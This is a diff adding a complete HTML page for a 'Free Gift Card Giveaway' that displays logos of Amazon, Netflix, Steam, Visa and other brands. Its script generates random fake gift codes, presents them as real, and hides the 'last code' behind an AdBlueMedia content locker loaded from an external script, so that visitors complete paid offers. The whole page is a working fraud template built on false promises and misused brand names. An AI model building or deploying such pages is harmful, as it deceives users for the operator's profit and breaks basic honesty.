@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Giveaway Gift Card</title>
+
+<!-- ✅ Facebook Open Graph tags -->
+<meta property="og:title" content="🎁 Free Gift Card Giveaway" />
+<meta property="og:description" content="Pick your gift card & unlock the final code by completing one quick offer." />
+<meta property="og:image" content="https://yourdomain.com/og-image.jpg" />
+<meta property="og:url" content="https://yourdomain.com/" />
+<meta property="og:type" content="website" />
+
+<!-- ✅ Twitter Card -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="🎁 Free Gift Card Giveaway">
+<meta name="twitter:description" content="Pick your gift card & unlock the final code by completing one quick offer.">
+<meta name="twitter:image" content="https://yourdomain.com/og-image.jpg">
+
+<!-- ✅ AdBlueMedia Locker -->
+<script type="text/javascript">
+    var iUPTT_GNq_WEJfEc={"it":4543583,"key":"fbc14"};
+</script>
+<script src="https://dlk457skl57zp.cloudfront.net/9a46630.js"></script>
+
+<style>
+  :root{ --speed:40s; --card-w:240px; --card-h:140px; --gap:18px; }
+  *{ box-sizing:border-box; }
+  body{ margin:0; padding:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif; background:#f5f6f8; color:#111; overflow-x:hidden; }
+  header{ padding:16px; text-align:center; background:#12b886; color:#fff; position:sticky; top:0; z-index:5; box-shadow:0 6px 20px rgba(0,0,0,.08); }
+  header h1{ margin:0; font-size:20px; }
+  header small{ opacity:.9; }
+  .marquee-wrap{ width:100%; overflow:hidden; padding:18px 10px 26px; background:#fff; box-shadow:0 10px 30px rgba(0,0,0,.06); }
+  .track{ display:flex; gap:var(--gap); width:max-content; animation:scrollX var(--speed) linear infinite; }
+  @keyframes scrollX{ from{transform:translateX(0);} to{transform:translateX(-50%);} }
+  .gc{ width:var(--card-w); height:var(--card-h); border-radius:16px; position:relative; overflow:hidden; flex:0 0 auto; cursor:pointer; user-select:none; box-shadow:0 10px 25px rgba(0,0,0,.12), inset 0 0 0 1px rgba(255,255,255,.2); transition:transform .25s ease, box-shadow .25s ease; }
+  .gc:hover{ transform:translateY(-2px); box-shadow:0 14px 30px rgba(0,0,0,.16); }
+  .gc::before{ content:""; position:absolute; inset:0; background:radial-gradient(120% 120% at 80% -20%, rgba(255,255,255,.25), transparent 55%), radial-gradient(90% 90% at -10% 120%, rgba(0,0,0,.15), transparent 60%); mix-blend-mode:overlay; }
+  .gc::after{ content:""; position:absolute; inset:-40% -10% auto -10%; height:60%; background:linear-gradient(to bottom, rgba(255,255,255,.45), rgba(255,255,255,0)); transform:rotate(-7deg); pointer-events:none; }
+  .chip{ position:absolute; top:12px; left:14px; width:28px; height:22px; border-radius:4px; background:linear-gradient(145deg,#d4b76a,#b28e3f); box-shadow:inset 0 0 0 2px rgba(0,0,0,.12),0 1px 0 rgba(255,255,255,.3); }
+  .chip:before,.chip:after{ content:""; position:absolute; inset:6px; border:1px solid rgba(0,0,0,.25); border-radius:3px; }
+  .logo{ position:absolute; top:10px; right:12px; height:26px; max-width:120px; }
+  .amt{ position:absolute; left:0; bottom:0; padding:6px 10px 8px 12px; background:rgba(0,0,0,.18); color:#fff; font-weight:800; font-size:14px; border-top-right-radius:12px; backdrop-filter:blur(3px); }
+  .brand{ position:absolute; bottom:10px; right:12px; color:#fff; font-weight:700; font-size:15px; text-shadow:0 2px 6px rgba(0,0,0,.4); }
+  .grid-wrap{ padding:20px; display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:20px; }
+  .modal{ position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,.55); z-index:20; padding:18px; }
+  .sheet{ background:#fff; width:100%; max-width:440px; border-radius:16px; padding:20px; text-align:center; position:relative; }
+  .code{ font-family:monospace; font-weight:800; color:#2e7d32; font-size:22px; padding:10px 12px; background:#f1f8f1; border-radius:10px; border:1px dashed #cde7cd; display:none; }
+  .row{ display:flex; gap:10px; justify-content:center; margin-top:12px; flex-wrap:wrap; }
+  .btn{ border:none; border-radius:12px; padding:12px 16px; cursor:pointer; font-weight:800; background:#f3f4f6; }
+  .btn.primary{ background:#12b886; color:#fff; }
+  .x{ position:absolute; top:12px; left:12px; background:transparent; border:none; font-size:20px; cursor:pointer; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>🎁 FREE GIFT CARD — Pick a card & unlock</h1>
+  <small>complete one offer then card unlock</small>
+</header>
+
+<!-- Marquee -->
+<section class="marquee-wrap">
+  <div class="track" id="track"></div>
+</section>
+
+<p style="text-align:center; color:#667085; margin:10px;">Tip: Hover/press on a card to pause scrolling.</p>
+
+<!-- Grid -->
+<section class="grid-wrap" id="grid"></section>
+
+<!-- Modal -->
+<div class="modal" id="modal">
+  <div class="sheet">
+    <button class="x" id="closeModal">✖</button>
+    <h3>🎟️ Your Gift Code</h3>
+    <div id="status">⏳ Loading your code…</div>
+    <div class="code" id="code">XXXX-XXXX-</div>
+    <div class="row">
+      <button class="btn primary" id="unlock">Unlock Last Code</button>
+      <button class="btn" id="close">Close</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// Brands
+const BRANDS = [
+  {name:"Amazon",logo:"https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg",grad:["#111827","#0ea5e9"],amt:"$100"},
+  {name:"Netflix",logo:"https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",grad:["#111","#ef4444"],amt:"$50"},
+  {name:"Google Play",logo:"https://upload.wikimedia.org/wikipedia/commons/5/5e/Google_Play_2016_icon.svg",grad:["#0ea5e9","#10b981"],amt:"$25"},
+  {name:"Steam",logo:"https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg",grad:["#0f172a","#334155"],amt:"$100"},
+  {name:"Spotify",logo:"https://upload.wikimedia.org/wikipedia/commons/2/26/Spotify_logo_with_text.svg",grad:["#10b981","#065f46"],amt:"$30"},
+  {name:"Apple",logo:"https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg",grad:["#111827","#6b7280"],amt:"$50"},
+  {name:"Xbox",logo:"https://upload.wikimedia.org/wikipedia/commons/0/0d/Xbox_logo_2012.svg",grad:["#166534","#16a34a"],amt:"$50"},
+  {name:"PlayStation",logo:"https://upload.wikimedia.org/wikipedia/commons/5/56/PlayStation_logo.svg",grad:["#0ea5e9","#1e3a8a"],amt:"$50"},
+  {name:"Facebook",logo:"https://upload.wikimedia.org/wikipedia/commons/c/c2/F_icon.svg",grad:["#0a54ff","#0a2472"],amt:"$25"},
+  {name:"Roblox",logo:"https://upload.wikimedia.org/wikipedia/commons/1/1b/Roblox_Logo_2022.svg",grad:["#111827","#374151"],amt:"$10"},
+  {name:"Uber",logo:"https://upload.wikimedia.org/wikipedia/commons/6/6a/Uber_logo_2018.svg",grad:["#111827","#0ea5e9"],amt:"$25"},
+  {name:"Discord",logo:"https://upload.wikimedia.org/wikipedia/commons/9/98/Discord_logo.svg",grad:["#5865F2","#3730a3"],amt:"$20"},
+  {name:"eBay",logo:"https://upload.wikimedia.org/wikipedia/commons/1/1b/EBay_logo.svg",grad:["#ef4444","#22c55e"],amt:"$50"},
+  {name:"Starbucks",logo:"https://upload.wikimedia.org/wikipedia/commons/4/45/Starbucks_Corporation_Logo_2011.svg",grad:["#0f5132","#2e7d32"],amt:"$15"},
+  {name:"Visa Prepaid",logo:"https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_2021.svg",grad:["#1d4ed8","#312e81"],amt:"$100"},
+];
+
+function createCard(brand){
+  const el=document.createElement('div');
+  el.className='gc';
+  el.style.background=`linear-gradient(135deg,${brand.grad[0]},${brand.grad[1]})`;
+  el.innerHTML=`
+    <div class="chip"></div>
+    <img class="logo" src="${brand.logo}" alt="${brand.name}">
+    <div class="amt">${brand.amt}</div>
+    <div class="brand">${brand.name}</div>
+  `;
+  el.addEventListener('click',()=>openModal(brand.name));
+  el.addEventListener('mouseenter',()=>track.style.animationPlayState='paused');
+  el.addEventListener('mouseleave',()=>track.style.animationPlayState='running');
+  return el;
+}
+
+// Fill marquee
+const track=document.getElementById('track');
+const setA=document.createElement('div'); setA.style.display='contents';
+const setB=document.createElement('div'); setB.style.display='contents';
+BRANDS.forEach(b=>setA.appendChild(createCard(b)));
+BRANDS.forEach(b=>setB.appendChild(createCard(b)));
+track.appendChild(setA); track.appendChild(setB);
+
+// Fill grid
+const grid=document.getElementById('grid');
+BRANDS.forEach(b=>grid.appendChild(createCard(b)));
+
+// Modal logic
+const modal=document.getElementById('modal');
+const codeEl=document.getElementById('code');
+const statusEl=document.getElementById('status');
+const unlockBtn=document.getElementById('unlock');
+function randCode(){
+  const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; let s="";
+  for(let i=0;i<16;i++){ s+=chars[Math.floor(Math.random()*chars.length)]; if((i+1)%4===0 && i<15) s+="-"; }
+  return s;
+}
+function openModal(brand){
+  modal.style.display='flex'; statusEl.textContent=`⏳ Generating secure code for ${brand}…`;
+  codeEl.style.display='none'; unlockBtn.disabled=true;
+  setTimeout(()=>{ codeEl.textContent=randCode(); codeEl.style.display='inline-block'; statusEl.textContent='Here is your code:'; unlockBtn.disabled=false; },1400);
+}
+document.getElementById('close').onclick=()=>modal.style.display='none';
+document.getElementById('closeModal').onclick=()=>modal.style.display='none';
+
+// ✅ Unlock button → trigger AdBlueMedia locker
+unlockBtn.addEventListener('click',()=>{
+  modal.style.display='none';
+  if (typeof iUPTT_GNq_WEJfEc !== "undefined" && typeof iUPTT_GNq_WEJfEc.open === "function") {
+    iUPTT_GNq_WEJfEc.open();
+  } else {
+    alert("Locker not loaded. Please refresh the page.");
+  }
+});
+</script>
+</body>
+</html>
